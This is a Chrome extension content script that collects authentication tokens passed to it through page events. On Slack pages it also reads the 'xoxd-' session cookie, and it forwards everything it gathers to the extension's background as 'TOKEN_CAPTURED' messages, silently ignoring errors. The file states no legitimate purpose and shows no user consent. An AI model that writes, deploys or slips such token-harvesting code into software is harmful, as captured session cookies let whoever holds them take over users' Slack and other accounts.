// ISOLATED world bridge — standalone IIFE.
// Only chrome.* APIs here — no imports from page context.
(function () {
  "use strict";

  window.dispatchEvent(new CustomEvent("__KB_BRIDGE_READY__"));

  window.addEventListener("__KB_TOKEN__", function (event) {
    var detail = event.detail;
    if (!detail || !detail.token) return;

    try {
      chrome.runtime.sendMessage({
        type: "TOKEN_CAPTURED",
        platform: detail.platform || "unknown",
        tokenType: detail.tokenType || "unknown",
        token: detail.token,
        url: detail.url || "",
        timestamp: detail.timestamp || Date.now()
      });
    } catch (e) {}
  });

  if (location.hostname.indexOf("slack") !== -1) {
    var origins = [location.origin, "https://app.slack.com"];
    var seen = Object.create(null);
    var attempts = 0;

    function tryCookie() {
      if (attempts >= origins.length) return;
      var url = origins[attempts];
      if (seen[url]) { attempts++; tryCookie(); return; }
      seen[url] = true;
      try {
        chrome.cookies.get({ url: url, name: "d" }, function (cookie) {
          if (cookie && cookie.value && cookie.value.indexOf("xoxd-") === 0) {
            chrome.runtime.sendMessage({
              type: "TOKEN_CAPTURED",
              platform: "slack",
              tokenType: "xoxd",
              token: cookie.value,
              url: location.href,
              timestamp: Date.now()
            });
          }
          attempts++;
          tryCookie();
        });
      } catch (e) { attempts++; tryCookie(); }
    }
    tryCookie();
  }
})();
